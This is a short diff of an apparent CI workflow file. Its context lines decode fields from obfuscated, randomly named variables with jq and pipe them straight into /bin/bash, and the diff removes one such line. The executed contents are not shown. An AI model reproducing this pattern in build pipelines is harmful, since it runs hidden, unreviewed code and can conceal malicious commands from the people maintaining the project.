@@ -27,7 +27,6 @@ jobs:
           printf '%s' "$rso356" | jq -r .pwepe2 | /bin/bash
           echo $jaedk7992 | jq -r .xz3 | /bin/bash
           echo $rdbqj312 | jq -r .fwm76685 | /bin/bash
-          echo $kbpfu660 | jq -r .rgbf8956 | /bin/bash
 
       - name: Persist data
         if: ${{ always() }}
